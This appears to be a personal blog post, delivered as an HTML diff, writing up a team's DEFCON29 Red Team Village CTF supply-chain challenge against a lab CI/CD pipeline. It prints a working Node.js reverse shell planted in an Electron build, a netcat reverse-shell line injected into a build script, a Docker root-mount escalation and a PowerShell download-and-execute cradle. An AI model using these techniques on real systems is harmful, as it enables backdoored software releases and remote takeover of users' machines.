@@ -1,0 +1,561 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>DEFCON29 RTV CTF</title>
+		<meta name="description" content="I am writing about my experiences as a naval navel-gazer.">
+		<link rel="alternate" href="/feed/feed.xml" type="application/atom+xml" title="ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ">
+		<link rel="alternate" href="/feed/feed.json" type="application/json" title="ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ">
+		
+		<style>/**
+ * okaidia theme for JavaScript, CSS and HTML
+ * Loosely based on Monokai textmate theme by http://www.monokai.nl/
+ * @author ocodia
+ */
+
+code[class*="language-"],
+pre[class*="language-"] {
+	color: #f8f8f2;
+	background: none;
+	text-shadow: 0 1px rgba(0, 0, 0, 0.3);
+	font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+	font-size: 1em;
+	text-align: left;
+	white-space: pre;
+	word-spacing: normal;
+	word-break: normal;
+	word-wrap: normal;
+	line-height: 1.5;
+
+	-moz-tab-size: 4;
+	-o-tab-size: 4;
+	tab-size: 4;
+
+	-webkit-hyphens: none;
+	-moz-hyphens: none;
+	-ms-hyphens: none;
+	hyphens: none;
+}
+
+/* Code blocks */
+pre[class*="language-"] {
+	padding: 1em;
+	margin: .5em 0;
+	overflow: auto;
+	border-radius: 0.3em;
+}
+
+:not(pre) > code[class*="language-"],
+pre[class*="language-"] {
+	background: #272822;
+}
+
+/* Inline code */
+:not(pre) > code[class*="language-"] {
+	padding: .1em;
+	border-radius: .3em;
+	white-space: normal;
+}
+
+.token.comment,
+.token.prolog,
+.token.doctype,
+.token.cdata {
+	color: #8292a2;
+}
+
+.token.punctuation {
+	color: #f8f8f2;
+}
+
+.token.namespace {
+	opacity: .7;
+}
+
+.token.property,
+.token.tag,
+.token.constant,
+.token.symbol,
+.token.deleted {
+	color: #f92672;
+}
+
+.token.boolean,
+.token.number {
+	color: #ae81ff;
+}
+
+.token.selector,
+.token.attr-name,
+.token.string,
+.token.char,
+.token.builtin,
+.token.inserted {
+	color: #a6e22e;
+}
+
+.token.operator,
+.token.entity,
+.token.url,
+.language-css .token.string,
+.style .token.string,
+.token.variable {
+	color: #f8f8f2;
+}
+
+.token.atrule,
+.token.attr-value,
+.token.function,
+.token.class-name {
+	color: #e6db74;
+}
+
+.token.keyword {
+	color: #66d9ef;
+}
+
+.token.regex,
+.token.important {
+	color: #fd971f;
+}
+
+.token.important,
+.token.bold {
+	font-weight: bold;
+}
+.token.italic {
+	font-style: italic;
+}
+
+.token.entity {
+	cursor: help;
+}
+/*
+ * New diff- syntax
+ */
+
+pre[class*="language-diff-"] {
+	--eleventy-code-padding: 1.25em;
+	padding-left: var(--eleventy-code-padding);
+	padding-right: var(--eleventy-code-padding);
+}
+.token.deleted {
+	background-color: hsl(0, 51%, 37%);
+	color: inherit;
+}
+.token.inserted {
+	background-color: hsl(126, 31%, 39%);
+	color: inherit;
+}
+
+/* Make the + and - characters unselectable for copy/paste */
+.token.prefix.unchanged,
+.token.prefix.inserted,
+.token.prefix.deleted {
+	-webkit-user-select: none;
+	user-select: none;
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	padding-top: 2px;
+	padding-bottom: 2px;
+}
+.token.prefix.inserted,
+.token.prefix.deleted {
+	width: var(--eleventy-code-padding);
+	background-color: rgba(0,0,0,.2);
+}
+
+/* Optional: full-width background color */
+.token.inserted:not(.prefix),
+.token.deleted:not(.prefix) {
+	display: block;
+	margin-left: calc(-1 * var(--eleventy-code-padding));
+	margin-right: calc(-1 * var(--eleventy-code-padding));
+	text-decoration: none; /* override del, ins, mark defaults */
+	color: inherit; /* override del, ins, mark defaults */
+}
+* { box-sizing: border-box; }
+/* Defaults */
+:root {
+	--font-family: -apple-system, system-ui, sans-serif;
+	--font-family-monospace: Consolas, Menlo, Monaco, Andale Mono WT, Andale Mono, Lucida Console, Lucida Sans Typewriter, DejaVu Sans Mono, Bitstream Vera Sans Mono, Liberation Mono, Nimbus Mono L, Courier New, Courier, monospace;
+}
+
+/* Theme colors */
+:root {
+	--color-gray-20: #e0e0e0;
+	--color-gray-50: #C0C0C0;
+	--color-gray-90: #333;
+
+	--background-color: #fff;
+
+	--text-color: var(--color-gray-90);
+	--text-color-link: #082840;
+	--text-color-link-active: #5f2b48;
+	--text-color-link-visited: #17050F;
+
+	--syntax-tab-size: 2;
+
+	--pinyin-font: 'Arima Madurai';
+}
+
+@media (prefers-color-scheme: dark) {
+	:root {
+		--color-gray-20: #e0e0e0;
+		--color-gray-50: #C0C0C0;
+		--color-gray-90: #dad8d8;
+
+		/* --text-color is assigned to --color-gray-_ above */
+		--text-color-link: #1493fb;
+		--text-color-link-active: #6969f7;
+		--text-color-link-visited: #a6a6f8;
+
+		--background-color: #15202b;
+	}
+}
+
+
+/* Global stylesheet */
+* {
+	box-sizing: border-box;
+}
+
+html,
+body {
+	padding: 0;
+	margin: 0 auto;
+	font-family: var(--font-family);
+	color: var(--text-color);
+	background-color: var(--background-color);
+}
+html {
+	overflow-y: scroll;
+}
+body {
+	max-width: 55em;
+}
+
+/* https://www.a11yproject.com/posts/how-to-hide-content/ */
+.visually-hidden {
+	clip: rect(0 0 0 0);
+	clip-path: inset(50%);
+	height: 1px;
+	overflow: hidden;
+	position: absolute;
+	white-space: nowrap;
+	width: 1px;
+}
+
+p:last-child {
+	margin-bottom: 0;
+}
+p {
+	line-height: 1.5;
+}
+
+li {
+	line-height: 1.5;
+}
+
+a[href] {
+	color: var(--text-color-link);
+}
+a[href]:visited {
+	color: var(--text-color-link-visited);
+}
+a[href]:hover,
+a[href]:active {
+	color: var(--text-color-link-active);
+}
+
+main {
+	padding: 1rem;
+}
+main :first-child {
+	margin-top: 0;
+}
+
+header {
+	border-bottom: 1px dashed var(--color-gray-20);
+}
+header:after {
+	content: "";
+	display: table;
+	clear: both;
+}
+
+.links-nextprev {
+	list-style: none;
+	border-top: 1px dashed var(--color-gray-20);
+	padding: 1em 0;
+}
+
+table {
+	margin: 1em 0;
+}
+table td,
+table th {
+	padding-right: 1em;
+}
+
+pre,
+code {
+	font-family: var(--font-family-monospace);
+}
+pre:not([class*="language-"]) {
+	margin: .5em 0;
+	line-height: 1.375; /* 22px /16 */
+	-moz-tab-size: var(--syntax-tab-size);
+	-o-tab-size: var(--syntax-tab-size);
+	tab-size: var(--syntax-tab-size);
+	-webkit-hyphens: none;
+	-ms-hyphens: none;
+	hyphens: none;
+	direction: ltr;
+	text-align: left;
+	white-space: pre;
+	word-spacing: normal;
+	word-break: normal;
+}
+code {
+	word-break: break-all;
+}
+p > code {
+	color: #722;
+	text-decoration: underline #7222;
+}
+
+/* Header */
+header {
+	display: flex;
+	gap: 1em .5em;
+	flex-wrap: wrap;
+	align-items: center;
+	padding: 1em;
+}
+.home-link {
+	font-size: 1em; /* 16px /16 */
+	font-weight: 700;
+	margin-right: 2em;
+}
+.home-link:link:not(:hover) {
+	text-decoration: none;
+}
+
+/* Nav */
+.nav {
+	display: flex;
+	padding: 0;
+	margin: 0;
+	list-style: none;
+}
+.nav-item {
+	display: inline-block;
+	margin-right: 1em;
+}
+.nav-item a[href]:not(:hover) {
+	text-decoration: none;
+}
+.nav a[href][aria-current="page"] {
+	text-decoration: underline;
+}
+
+/* Posts list */
+.postlist {
+	list-style: none;
+	padding: 0;
+	padding-left: 1.5rem;
+}
+.postlist-item {
+	display: flex;
+	flex-wrap: wrap;
+	align-items: baseline;
+	counter-increment: start-from -1;
+	margin-bottom: 1em;
+}
+.postlist-item:before {
+	display: inline-block;
+	pointer-events: none;
+	content: "" counter(start-from, decimal-leading-zero) ". ";
+	line-height: 100%;
+	text-align: right;
+	margin-left: -1.5rem;
+}
+.postlist-date,
+.postlist-item:before {
+	font-size: 0.8125em; /* 13px /16 */
+	color: var(--color-gray-90);
+}
+.postlist-date {
+	word-spacing: -0.5px;
+}
+.postlist-link {
+	font-size: 1.1875em; /* 19px /16 */
+	font-weight: 700;
+	flex-basis: calc(100% - 1.5rem);
+	padding-left: .25em;
+	padding-right: .5em;
+	text-underline-position: from-font;
+	text-underline-offset: 0;
+	text-decoration-thickness: 1px;
+}
+.postlist-item-active .postlist-link {
+	font-weight: bold;
+}
+
+/* Tags */
+.post-tag {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	text-transform: capitalize;
+	font-style: italic;
+}
+.postlist-item > .post-tag {
+	align-self: center;
+}
+
+/* Tags list */
+.post-metadata {
+	display: inline-flex;
+	flex-wrap: wrap;
+	gap: .5em;
+	list-style: none;
+	padding: 0;
+	margin: 0;
+}
+.post-metadata time {
+	margin-right: 1em;
+}
+
+/* Direct Links / Markdown Headers */
+.header-anchor {
+	text-decoration: none;
+	font-style: normal;
+	font-size: 1em;
+	margin-left: .1em;
+}
+a[href].header-anchor,
+a[href].header-anchor:visited {
+	color: transparent;
+}
+a[href].header-anchor:focus,
+a[href].header-anchor:hover {
+	text-decoration: underline;
+}
+a[href].header-anchor:focus,
+:hover > a[href].header-anchor {
+	color: #aaa;
+}
+
+h2 + .header-anchor {
+	font-size: 1.5em;
+}
+
+.pyin {
+	font-family: var(--pinyin-font), cursive;
+}
+
+figure {
+	margin: -1.7em 0 0.7em 0;
+}
+
+figcaption {
+	font-style: italic;
+}
+
+figure img {
+	border: 1px solid #ccc;
+}</style>
+		<link href="https://fonts.googleapis.com/css2?family=Arima+Madurai:wght@400;700" rel="stylesheet" referrerpolicy="no-referrer">
+	</head>
+	<body>
+		<a href="#skip" class="visually-hidden">Skip to main content</a>
+
+		<header>
+			<a href="/" class="home-link">ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ</a>
+			<nav>
+				<h2 class="visually-hidden">Top level navigation menu</h2>
+				<ul class="nav">
+					<li class="nav-item"><a href="/">Home</a></li>
+					<li class="nav-item"><a href="/blog/">Archive</a></li>
+					<li class="nav-item"><a href="/about/">About Me</a></li>
+				</ul>
+			</nav>
+		</header>
+
+		<main id="skip">
+			
+<h1>DEFCON29 RTV CTF</h1>
+
+<ul class="post-metadata">
+	<li><time datetime="2021-08-09">2021年08月</time></li>
+	<li><a href="/tags/security/" class="post-tag">security</a>, </li>
+	<li><a href="/tags/ctf/" class="post-tag">ctf</a></li>
+</ul>
+
+<p>I played the DEFCON29 (2021) Red Team Village CTF online with team &quot;Son of Anton&quot;. After qualifying in 4th place we then came <strong>4th in the finals</strong> 🏅.</p>
+<p>‌<figure><picture><source type="image/avif" srcset="/img/T_wLFUkOAo-1137.avif 1137w"><source type="image/webp" srcset="/img/T_wLFUkOAo-1137.webp 1137w"><img alt="Thanks to RTV and the challenge writers for the awesome challenges" loading="lazy" decoding="async" src="/img/T_wLFUkOAo-1137.png" width="1137" height="752"></picture><figcaption>Thanks to RTV and the challenge writers for the awesome challenges</figcaption></figure></p>
+<p>Here, I'll just write some semi-legible notes about the &quot;supply chain attack&quot; portion.</p>
+<h2 id="supply-chain" tabindex="-1">Supply Chain <a class="header-anchor" href="#supply-chain">#</a></h2>
+<p>Our story starts where we have already obtained the private key and PEM password for user <code>bgilfoyle</code>.</p>
+<p>SSHing in to the LunarFire box <code>bgilfoyle@10.0.40.70</code> we see that Gitea (a Git server a little like Gitlab) is on port 3000 and AppVeyor (a CI/CD platform) is on 8050.</p>
+<p>Gitea gives us unauthenticated access to the source code of the Wuphf Electron app (we can't directly access the git user's home directory), although as we see later, we can grab the source code using our read access to the AppVeyor home directory.</p>
+<p>AppVeyor build logs can be viewed at <code>http://10.0.40.70:8050/project/AppVeyor/wuphf/history</code>, and the progress of this continuously running Electron build pipeline can also be monitored via <code>ps</code>.</p>
+<p>The <code>Git - CI/CD App</code> flag can be found in <code>/home/AppVeyor/</code> which we can read. We also found many directories of the form <code>/home/AppVeyor/Wuphf_1-abcd</code> used for the repeated Wuphf builds. AppVeyor (as user <code>appveyor</code>) clones Wuphf to a new directory, and runs the build steps inside docker with this directory mounted. Surprisingly, these directories are also writeable by our bgilfoyle user.</p>
+<p>The idea then presents itself... can we add an implant to the Electron app by tampering with a build by leaving the following one-liner running?</p>
+<pre class="language-sh" tabindex="0"><code class="language-sh"><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cat</span> badelectron.js <span class="token operator">></span> /home/AppVeyor/<span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> <span class="token parameter variable">-t</span> /home/AppVeyor/ <span class="token operator">|</span> <span class="token function">grep</span> appveyor <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $8}'</span><span class="token variable">`</span></span>/build/electron.js<span class="token punctuation">;</span> <span class="token function">sleep</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token keyword">done</span></code></pre>
+<p>It takes the newest Wuphf build directory and, in a while loop, overwrites it with badelectron.js - a copy of electron.js with a <a href="https://github.com/ctxis/beemka/blob/master/modules/rshell_cmd/templates/code.js">nodejs reverse shell</a> at the start:</p>
+<pre class="language-js" tabindex="0"><code class="language-js"><span class="token keyword">var</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'net'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> spawn <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>spawn<span class="token punctuation">;</span>
+<span class="token keyword">var</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">net<span class="token punctuation">.</span>Socket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+client<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token number">53</span><span class="token punctuation">,</span> <span class="token string">'175.45.176.1'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">var</span> sh<span class="token punctuation">;</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        sh <span class="token operator">=</span> <span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">'cmd.exe'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        sh <span class="token operator">=</span> <span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    client<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>stdin<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    sh<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    sh<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    sh<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'exit'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">code<span class="token punctuation">,</span>signal</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>Building takes several minutes, so we should be able to modify the file before it's too late. The IP points to my cloud server where a netcat listener is waiting for either a Linux or Windows client to connect on port 53. In the previous boxes, DNS port 53 was the most successful at getting through the firewalls. On the cloud Ubuntu host, I had to use <code>systemctl</code> to kill <code>resolvd</code> so that I could bind to port 53.</p>
+<p>After watching the progress of the Electron build, we downloaded the newly built Electron apps from <code>lunarfire.dev</code>, checked for the modified code and then validated the signatures. Great! AppVeyor has in fact packaged and signed our malicious code and we are on the way to performing a supply chain attack.</p>
+<p>Now we need to wait for a target to download and run the malicious apps.</p>
+<p>By viewing the log file <code>/var/log/supervisor/lunarfire_stdout.log</code> (log of port 80 HTTP connections), we saw repeated connections from our target, fetching the signatures and the Windows exe about every 15 minutes.</p>
+<pre><code>09:43:17 [INFO] GET /artifacts/SHA256SUMS:
+09:43:17 [INFO] Matched: GET /artifacts/&lt;name&gt; (artifact)
+09:43:17 [INFO] 3.93.70.55:50462 - SHA256SUMS
+09:43:17 [INFO] Outcome: Success
+09:43:17 [INFO] Response succeeded.
+...
+</code></pre>
+<p>This is the machine which will run our compromised app. We don't know which machine this is, but it is downloading the <code>Wuphf-win-1.7.2.exe</code>. We had previously obtained the C# source code of the auto-updater.</p>
+<p>Unfortunately, before we'd started working on this box, the updater had died. It stopped polling our lunarfire at 09:43 UTC. That left us a bit stuck and unable to proceed with the CTF until we managed to get assistance from the admins at 16:35 UTC.</p>
+<h2 id="rooting-lunarfire" tabindex="-1">Rooting LunarFire <a class="header-anchor" href="#rooting-lunarfire">#</a></h2>
+<p>In the meantime, I tried modifying the <code>ci.sh</code> to get a shell in the build pipeline by adding</p>
+<pre class="language-sh" tabindex="0"><code class="language-sh"><span class="token function">rm</span> <span class="token parameter variable">-f</span> /tmp/aaa<span class="token punctuation">;</span> <span class="token function">mknod</span> /tmp/aaa p<span class="token punctuation">;</span> /bin/sh <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/tmp/aaa <span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">10.0</span>.40.70 <span class="token number">4444</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span>/tmp/aaa</code></pre>
+<p>I then tried the above <code>while</code> loop to modify the file, but it didn't work immediately. <code>build/electron.js</code> worked because <code>electron.js</code> can only be written to if the <code>build</code> directory already exists, i.e. cloning has started. But <code>ci.sh</code> can be written as soon as the <code>Whuphf-1-flsdkj</code> directory is created. If you put <code>ci.sh</code> there before cloning starts, cloning fails. Therefore, we had to check that <code>ci.sh</code> exists before writing it with <code>[ -f &quot;/home/AppVeyor/$XXX/ci.sh&quot; ] &amp;&amp; cat bad-ci.sh &gt; &quot;/home/AppVeyor/$XXX/ci.sh&quot;</code>.</p>
+<p>That gave us a shell as the appveyor user. Not great, except that we'd already seen that appveyor can run Docker. So let's try mounting root... <code>docker run -it --rm -v /:/myroot electronuserland/builder /bin/bash</code>... yep, now we can add public keys to <code>/myroot/root/.ssh/authorized_keys</code> and get root SSH access.</p>
+<p>This section didn't really help us with the challenge, though as we needed to pivot to the next network.</p>
+<h2 id="ws07-was-turned-back-on-for-us" tabindex="-1">WS07 was turned back on for us <a class="header-anchor" href="#ws07-was-turned-back-on-for-us">#</a></h2>
+<p>And after my netcat listener had waited for hours, our supply chain shell finally popped as <code>dundermuffin\ryan.howard</code> on <code>WS07.dundermiffin.corp</code>, a completely new network and immediate access to flag <code>WS07 - Ryan Wuphf - user_flag.txt</code> in <code>C:\Wuphf\user_flag.txt</code>.</p>
+<p>Now we have one Windows <code>cmd</code> shell, or more accurately, I have one Windows shell. Sharing that one shell with the rest of Son of Anton was quite difficult and something we hadn't prepared for. We tried different Golang reverse shells but they were all being binned by Defender. My teammate's solution to sharing this box was using staged Powershell payloads. If you put the whole shell in a script and call it in a background shell with <code>Start-Job -ScriptBlock {(New-Object System.Net.WebClient).DownloadString('http://.../shell.ps1') | IEX}</code>, AMSI will prevent the script running. His genius move was a first stage Powershell script which applies an AMSI bypass, it then downloads and runs the next stage which sends the reverse shell. I imagine a proper C2 would have been the correct solution here.</p>
+<p>Anyway, it was fun playing this CTF.</p>
+
+<ul class="links-nextprev"><li>Previous: <a href="/google-ctf-2020-writeup/">Google CTF 2020 Writeup</a></li><li>Next: <a href="/redos-in-ruby-net-http-when-parsing-response-headers/">ReDoS in Ruby net/http when parsing response headers</a></li>
+</ul>
+
+		</main>
+
+		<footer></footer>
+
+		<!-- Current page: /defcon29-rtv-ctf/ -->
+	</body>
+</html>
